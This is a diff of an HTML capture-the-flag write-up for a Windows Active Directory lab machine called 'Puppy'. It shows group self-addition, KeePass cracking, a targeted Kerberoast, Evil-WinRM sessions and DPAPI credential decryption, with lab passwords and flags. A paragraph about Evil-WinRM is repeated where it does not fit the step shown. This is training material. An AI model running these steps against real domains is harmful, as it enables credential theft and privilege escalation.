@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>Puppy is a Medium difficulty Windows AD machine. Starting with provided credentials, the attack path involves BloodHound reconnaissance, adding yourself to the <strong>Developers</strong> group, accessing a <strong>KeePass database</strong> on an SMB share, and using the credentials within to perform a <strong>Targeted Kerberoast</strong>. User flag is obtained via Evil-WinRM. Escalation continues through <strong>DPAPI credential decryption</strong> — finding a master key and credential file via winPEAS, then using <code>dpapi.py</code> to recover a privileged admin account's password.</p>
+      <p>Puppy is a Medium difficulty Windows AD machine. Starting with provided credentials, the attack path involves BloodHound reconnaissance, adding yourself to the <code>Developers</code> group, accessing a <code>KeePass database</code> on an SMB share, and using the credentials within to perform a <code>Targeted Kerberoast</code>. User flag is obtained via Evil-WinRM. Escalation continues through <code>DPAPI credential decryption</code> — finding a master key and credential file via winPEAS, then using <code>dpapi.py</code> to recover a privileged admin account's password.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <p>I start with a full port scan. This is an assumed-breach scenario with credentials: <code>levi.james / KingofAkron2025!</code>.</p>
@@ -203,7 +203,7 @@ LDAP        10.129.217.5    389    DC               Resolved collection methods:
 LDAP        10.129.217.5    389    DC               Done in 00M 06S
 LDAP        10.129.217.5    389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.217.5_2025-05-19_191822_bloodhound.zip</code></pre></div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250519193233.png" alt="BloodHound showing levi.james attack paths" loading="lazy" /><span class="img-caption">BloodHound showing levi.james attack paths</span></div>
-      <p>BloodHound reveals that <code>levi.james</code> can add himself to the <strong>Developers</strong> group. I do this using <code>net rpc group addmem</code>.</p>
+      <p>BloodHound reveals that <code>levi.james</code> can add himself to the <code>Developers</code> group. I do this using <code>net rpc group addmem</code>.</p>
       <div class="code-block"><pre><code>└─$ net rpc group addmem &quot;Developers&quot; &quot;levi.james&quot; -U &quot;puppy.htb&quot;/&quot;levi.james&quot;%&#x27;KingofAkron2025!&#x27; -S &quot;puppy.htb&quot;</code></pre></div>
       <p>I use <code>net rpc group addmem</code> to remotely add the user to the target Active Directory group. This command authenticates via the SMB protocol using the provided domain credentials and performs the group membership modification on the Domain Controller. After this change, the user inherits all permissions associated with the new group.</p>
       <div class="code-block"><pre><code>net rpc group members &quot;developers&quot; -U &quot;puppy.htb&quot;/&quot;levi.james&quot;%&#x27;KingofAkron2025!&#x27; -S &quot;puppy.htb&quot;
@@ -213,7 +213,7 @@ PUPPY\adam.silver
 PUPPY\jamie.williams</code></pre></div>
       <h2 class="writeup-section-title">Foothold: KeePass Database & Kerberoasting</h2>
       <h3 class="writeup-sub-title">Accessing the DEV Share</h3>
-      <p>As a Developers group member, I now have access to the <code>DEV</code> SMB share. Inside, I find a <strong>KeePass database</strong> (<code>recovery.kdbx</code>).</p>
+      <p>As a Developers group member, I now have access to the <code>DEV</code> SMB share. Inside, I find a <code>KeePass database</code> (<code>recovery.kdbx</code>).</p>
       <div class="code-block"><pre><code>smbmap -H puppy.htb -u levi.james -p KingofAkron2025!                                                        
 
     ________  ___      ___  _______   ___      ___       __         _______
@@ -264,7 +264,7 @@ https://github.com/r3nt0n/keepass4brute
       <div class="code-block"><pre><code>keepassxc recovery.kdbx</code></pre></div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250519201330.png" alt="KeePass database contents showing user credentials" loading="lazy" /><span class="img-caption">KeePass database contents showing user credentials</span></div>
       <h3 class="writeup-sub-title">Targeted Kerberoast</h3>
-      <p>BloodHound shows that <code>ant.edwards</code> (one of the KeePass users) has <strong>Full Control</strong> over user <code>adam.silver</code>, enabling a targeted Kerberoast attack. I use <code>targetedKerberoast.py</code> to extract the service ticket hash.</p>
+      <p>BloodHound shows that <code>ant.edwards</code> (one of the KeePass users) has <code>Full Control</code> over user <code>adam.silver</code>, enabling a targeted Kerberoast attack. I use <code>targetedKerberoast.py</code> to extract the service ticket hash.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250519203143.png" alt="Full Control relationship in BloodHound" loading="lazy" /><span class="img-caption">Full Control relationship in BloodHound</span></div>
       <p>The command output below reveals important information about the target system's configuration. I carefully examine the results for credentials, misconfigurations, version numbers, or any other details that could be leveraged for further exploitation.</p>
       <div class="code-block"><pre><code>python3 targetedKerberoast.py -v -d &#x27;puppy.htb&#x27; -u &#x27;ant.edwards&#x27; -p &#x27;Antman2025!&#x27;
@@ -286,13 +286,13 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\adam.silver\Documents&gt;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\adam.silver\Desktop&gt; cat user.txt
 98b32b5cf932d25bf64a5afe7446d72f</code></pre></div>
       <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">98b32b5cf932d25bf64a5afe7446d72f</code></div>
       <h2 class="writeup-section-title">Privilege Escalation: DPAPI Credential Decryption</h2>
       <h3 class="writeup-sub-title">WinPEAS Discovery</h3>
-      <p>I upload and run <strong>winPEAS</strong> for automated enumeration. It discovers a backup ZIP file containing <code>nms-auth-config.xml.bak</code> with credentials for user <code>steph.cooper</code>.</p>
+      <p>I upload and run <code>winPEAS</code> for automated enumeration. It discovers a backup ZIP file containing <code>nms-auth-config.xml.bak</code> with credentials for user <code>steph.cooper</code>.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\adam.silver\Desktop&gt; upload winPEASx64.exe
                                         
 Info: Uploading /home/kali/HTB/Puppy/winPEASx64.exe to C:\Users\adam.silver\Desktop\winPEASx64.exe
@@ -325,7 +325,7 @@ Info: Upload successful!</code></pre></div>
         &lt;filter&gt;(&amp;(objectClass=person)(uid=%s))&lt;/filter&gt;
     &lt;/search-filter&gt;
 &lt;/ldap-config&gt;</code></pre></div>
-      <p>I log in as <code>steph.cooper</code> and run winPEAS again. This time it discovers <strong>DPAPI</strong> (Data Protection API) master keys and credential files — Windows' built-in credential storage mechanism.</p>
+      <p>I log in as <code>steph.cooper</code> and run winPEAS again. This time it discovers <code>DPAPI</code> (Data Protection API) master keys and credential files — Windows' built-in credential storage mechanism.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\steph.cooper\Documents&gt; ./winPEASx64.exe
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
@@ -351,7 +351,7 @@ Info: Upload successful!</code></pre></div>
     Modified: 3/8/2025 7:54:29 AM
     Size: 414</code></pre></div>
       <h3 class="writeup-sub-title">DPAPI Master Key & Credential Decryption</h3>
-      <p><strong>DPAPI</strong> (Data Protection API) is Windows' built-in encryption framework for protecting credentials. Each user has a <strong>master key</strong> (encrypted with their password) that protects <strong>credential blobs</strong> containing saved passwords. To decrypt, we need: the master key file, the user's SID, and their password.</p>
+      <p><code>DPAPI</code> (Data Protection API) is Windows' built-in encryption framework for protecting credentials. Each user has a <code>master key</code> (encrypted with their password) that protects <code>credential blobs</code> containing saved passwords. To decrypt, we need: the master key file, the user's SID, and their password.</p>
       <p>The credential files are hidden with system/hidden attributes. I remove these attributes to make them downloadable.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107&gt; ls -Hidden
 
@@ -363,9 +363,9 @@ Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
 -a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
 -a-hs-         2/23/2025   2:36 PM             24 Preferred</code></pre></div>
-      <p>I use the <code>attrib</code> command to strip the <strong>System</strong> (<code>-S</code>) and <strong>Hidden</strong> (<code>-H</code>) file attributes. Windows protects certain sensitive files (like DPAPI master keys and credential stores) by marking them as system/hidden files, making them invisible in normal directory listings and preventing standard file operations. Removing these attributes makes the files visible and downloadable through the WinRM session.</p>
+      <p>I use the <code>attrib</code> command to strip the <code>System</code> (<code>-S</code>) and <code>Hidden</code> (<code>-H</code>) file attributes. Windows protects certain sensitive files (like DPAPI master keys and credential stores) by marking them as system/hidden files, making them invisible in normal directory listings and preventing standard file operations. Removing these attributes makes the files visible and downloadable through the WinRM session.</p>
       <div class="code-block"><pre><code>attrib -S -H &#x27;C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407&#x27;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107&gt; ls
 
 
@@ -425,7 +425,7 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents&gt;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents&gt; net user steph.cooper_adm
 User name                    steph.cooper_adm
 Full Name                    Stephen A. Cooper
@@ -452,7 +452,7 @@ Logon hours allowed          All
 Local Group Memberships      *Administrators
 Global Group memberships     *Domain Users
 The command completed successfully.</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
 7b0e5198492771c2fa32157d00937934</code></pre></div>
       <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">7b0e5198492771c2fa32157d00937934</code></div>
